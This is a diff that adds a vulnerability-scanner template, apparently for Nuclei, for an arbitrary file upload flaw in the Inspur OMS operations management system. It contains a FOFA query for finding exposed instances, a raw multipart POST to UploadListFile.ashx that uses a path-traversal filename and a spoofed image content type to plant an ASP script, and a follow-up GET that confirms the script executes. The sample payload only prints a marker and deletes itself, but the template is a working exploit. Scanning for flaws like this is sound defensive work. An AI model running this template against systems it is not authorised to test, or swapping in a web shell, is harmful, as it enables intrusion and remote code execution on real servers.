@@ -1,0 +1,41 @@
+id: inspur-oms-uploadlistfile-upload
+
+info:
+  name: "浪潮OMS运营管理系统uploadlistfile接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/cwbase/web/gsprtf/"
+      该漏洞源于浪潮OMS运营管理系统uploadlistfile接口未正确校验文件上传请求，攻击者可通过构造恶意文件上传请求在目标服务器存储任意文件，进而可能实现远程代码执行或系统权限提升。
+  tags: 浪潮
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------rww5upkbw6ctf0tu5hye
+    Connection: close
+
+    -----------------------------rww5upkbw6ctf0tu5hye
+    Content-Disposition: form-data; name="file"; filename="../../../../../../NTest.asp"
+    Content-Type: image/png
+
+    <% Response.Write("NdayTest"); set myfso=server.CreateObject("scripting.filesystemobject"); myfso.DeleteFile(Server.MapPath("NTest.asp")); %>
+    -----------------------------rww5upkbw6ctf0tu5hye--
+- raw:
+  - |
+    GET /cwbase/NTest.asp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
